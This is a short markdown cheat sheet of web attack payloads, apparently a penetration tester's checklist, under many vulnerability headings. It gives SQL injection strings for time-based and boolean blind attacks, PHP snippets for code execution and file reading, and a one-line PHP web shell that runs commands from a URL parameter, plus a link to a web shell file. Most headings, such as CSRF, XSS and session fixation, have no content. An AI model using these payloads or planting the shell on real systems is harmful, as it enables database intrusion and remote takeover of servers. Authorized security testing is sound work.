### Time Based Blind SQL Injection:
```
'(select * from (select(sleep(10)))a)
';WAITFOR DELAY '0:0:30'--
```
### Error Based SQL Injection:

### Boolean Based Blind SQL Injection:
```
'2 OR 1=1
''2 OR 1=1
"2 OR 1=1
'2 AND 1=1
''2 AND 1=1
"2 AND 1=1
```
### Local File Inclusion (LFI):
```


```
### Remote Code Execution (RCE):
```
<?php echo phpinfo(); ?>
<?php include 'C:\Windows\System32\drivers\etc\hosts';?>

```
### Malicious File Upload (Shell Execution):
```
<?php system($_GET['cmd']); ?>

https://github.com/hackerhijeck/For_Me/blob/main/Web_Shell.php
```
### Application is Vulnerable to Reverse Web shell (Shell Execution)
### File Upload Bypass 
### Session Hijacking
### Session Fixation in The Application
### Application is Vulnerable to Forceful Browsing
### Insecure Direct Object Reference
### URL Redirection in the application
### Reflected Cross Site Scripting Attack
### HTML Injection
### Link Injection
### Iframe Injection
### Blind Cross Site Scripting Attack
### Admin/User Login Authentication Bypass Using Success Response
### Cross Site Request Forgery (CSRF)
### Restricted Functionality Access in the Application
### Parameter Manipulation
### Test CGI script exposes environment variables
### Account Takeover through forget password
### Improper File Content Validation in the Application
### No Session Termination After Password Change
### Password History Check is not Implemented
### Concurrent Logins with the Same Username in admin/user account
### Trace method Enabled
### Full path disclosure
### Improper Input Validation in the Application
### Client side validation bypass of email and phone number verification
### Application is Vulnerable to Clickjacking Attacks
### OpenSSL Version disclose in the application
### Last Login Time Not Implemented in the Application
